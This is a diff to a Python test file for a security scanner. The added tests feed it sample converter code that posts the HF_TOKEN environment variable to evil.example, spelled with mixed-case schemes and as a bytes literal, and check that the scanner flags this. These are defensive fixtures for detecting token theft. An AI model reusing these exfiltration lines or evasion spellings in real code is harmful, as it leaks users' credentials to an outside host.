@@ -3180,7 +3180,32 @@ def test_the_hub_allowance_reads_the_real_hostname():
         )
     ]
 
+    # A scheme requests accepts is a scheme this has to read. requests
+    # normalizes HTTPS://, so a lowercase-only pattern let the destination be
+    # spelled past the check. It has to be tested BESIDE a hub literal: on its
+    # own the file names no host this can see, which is not suppressed anyway,
+    # so the case passes whether or not the scheme is read.
+    def _beside_the_hub(destination):
+        return [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'HUB = "https://huggingface.co/api/models"\n'
+                f'OUT = {destination}\n'
+                'requests.post(OUT, data = {"t": os.environ["HF_TOKEN"]})\n'
+            )
+        ]
+
+    assert _beside_the_hub('"HTTPS://evil.example/collect"')
+    assert _beside_the_hub('"HtTpS://evil.example/collect"')
+    assert _beside_the_hub('"https://evil.example/collect"')
+    assert _beside_the_hub('"https://huggingface.co/api/models"') == []
+
     # The shapes that really are the hub still pass, port and case included.
     assert _findings("https://huggingface.co/api/models") == []
     assert _findings("https://huggingface.co:443/api/models") == []
     assert _findings("https://HuggingFace.CO/api/models") == []
+
+    # bytes are URLs too: requests decodes b"https://..." and accepts it, so a
+    # destination in a bytes literal was invisible beside a str hub literal.
+    assert _beside_the_hub('b"https://evil.example/collect"')
